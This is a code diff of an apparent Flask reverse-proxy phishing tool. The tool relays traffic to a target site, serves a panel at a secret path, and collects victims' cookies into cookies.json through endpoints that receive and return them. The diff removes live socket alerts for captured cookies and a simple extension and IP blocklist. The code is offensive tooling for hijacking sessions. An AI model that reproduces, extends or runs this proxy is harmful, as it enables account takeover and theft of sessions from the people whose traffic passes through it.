@@ -1,7 +1,6 @@
 from flask import Flask, request, Response, send_from_directory, jsonify
 import requests, re, json, os
 from datetime import datetime
-from flask_socketio import SocketIO, emit
 import brotli
 
 # Initialize storage
@@ -9,30 +8,8 @@ if not os.path.exists('cookies.json'):
     with open('cookies.json', 'w') as f:
         json.dump([], f)
 
-if not os.path.exists('config.json'):
-    with open('config.json', 'w') as f:
-        json.dump({
-            'BLOCKED_EXTENSIONS': ['.exe', '.dll', '.bat'],
-            'BLOCKED_IPS': []
-        }, f)
-
-# Load config
-with open('config.json', 'r') as f:
-    CONFIG = json.load(f)
-
-requests_history = []
-MAX_HISTORY = 50
-
-def is_request_allowed(path, ip):
-    if any(path.endswith(ext) for ext in CONFIG['BLOCKED_EXTENSIONS']):
-        return False
-    if ip in CONFIG['BLOCKED_IPS']:
-        return False
-    return True
-
 def start_proxy(target, host, port, secret):
     app = Flask(__name__)
-    socketio = SocketIO(app, cors_allowed_origins="*")
 
     @app.route(f'/{secret}')
     def panel_index():
@@ -69,7 +46,6 @@ def start_proxy(target, host, port, secret):
         with open('cookies.json', 'w') as f:
             json.dump(existing_cookies, f)
 
-        socketio.emit('new_cookie', {'cookies': cookie_data})
         return jsonify({'message': 'Pong!'}), 200
 
     @app.route('/ep/api/getCookies', methods=['GET'])
@@ -110,9 +86,6 @@ def start_proxy(target, host, port, secret):
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     def proxy(path):
-        if not is_request_allowed(path, request.remote_addr):
-            return Response('Forbidden', 403)
-
         target_url = f"https://{target}/{path}"
 
         headers = {key: value for key, value in request.headers if key.lower() != 'host'}
@@ -157,4 +130,4 @@ def start_proxy(target, host, port, secret):
         except requests.exceptions.RequestException as e:
             return Response(f"Error: {str(e)}", status=500)
 
-    socketio.run(app, host=host, port=port)
+    app.run(host=host, port=port)
